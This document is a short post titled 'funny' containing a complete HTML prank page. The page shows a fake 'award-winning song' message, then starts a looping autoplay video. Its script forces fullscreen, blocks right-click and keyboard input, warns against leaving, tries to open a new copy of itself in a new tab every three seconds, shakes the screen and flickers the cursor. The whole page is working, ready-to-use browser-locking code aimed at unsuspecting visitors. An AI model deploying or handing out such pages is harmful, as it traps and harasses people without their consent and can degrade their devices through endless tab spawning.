# funny

html
Copy
Edit
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Important Message</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            padding: 50px;
            overflow: hidden;
        }
        #message {
            font-size: 24px;
            font-weight: bold;
            position: relative;
            animation: bounce 0.5s infinite alternate ease-in-out;
        }
        @keyframes bounce {
            0% { transform: translateY(0); }
            100% { transform: translateY(-10px); }
        }
        #prank {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <div id="message">This is a future award-winning song</div>

    <iframe id="prank" src="https://www.youtube.com/embed/D6OiwgcF-7M?autoplay=1&loop=1" allow="autoplay"></iframe>

    <script>
        function playPrank() {
            document.getElementById("message").style.display = "none";
            document.getElementById("prank").style.display = "block";

            // FORCE FULLSCREEN
            document.body.requestFullscreen();

            // DISABLE RIGHT CLICK
            document.addEventListener("contextmenu", event => event.preventDefault());

            // DISABLE KEYBOARD SHORTCUTS
            document.addEventListener("keydown", event => {
                event.preventDefault();
            });

            // PREVENT CLOSING THE TAB
            window.onbeforeunload = function () {
                return "You can't leave!";
            };

            // REOPENS TAB IF CLOSED
            setInterval(() => {
                window.open(location.href, "_blank");
            }, 3000);

            // RANDOM SCREEN SHAKES FOR CHAOS
            setInterval(() => {
                document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
            }, 100);

            // GLITCHING CURSOR FOR MAXIMUM ANNOYANCE
            setInterval(() => {
                document.body.style.cursor = Math.random() > 0.5 ? "wait" : "crosshair";
            }, 500);
        }

        // SHOW MESSAGE FOR 3 SECONDS, THEN UNLEASH CHAOS
        setTimeout(playPrank, 3000);
    </script>

</body>
</html>
